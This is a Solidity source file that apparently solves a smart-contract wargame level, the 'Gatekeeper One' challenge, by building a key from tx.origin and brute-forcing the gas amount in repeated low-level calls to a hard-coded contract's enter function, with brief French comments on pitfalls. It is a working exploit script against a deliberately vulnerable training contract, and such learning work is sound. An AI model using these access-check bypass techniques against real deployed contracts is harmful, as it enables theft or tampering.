// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

contract PassFirstGatekeeper {
    address gatekeeperAddress = 0x5b09360cB97e5D9277059D23274e5bf594b9Ebdf;
    uint64 public key = uint64(1 << 63) + uint16(uint160(tx.origin));

    function passGatekeeper() public {
        // "Using call (vs. an abstract interface) prevents reverts from propagating" .
        // donc utiliser un try and catch si tu veux utiliser l'interface.

        for (uint256 i = 0; i < 120; i++) {
            // attention a bien mettre enter(bytes8). En cas d'erreur c'est difficile de trouver le probleme
            (bool success, ) = gatekeeperAddress.call{gas: i + 150 + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
    }
}

contract Address {
    function getAddress16() public view returns (uint16) {
        return uint16(uint160(tx.origin));
    }
}
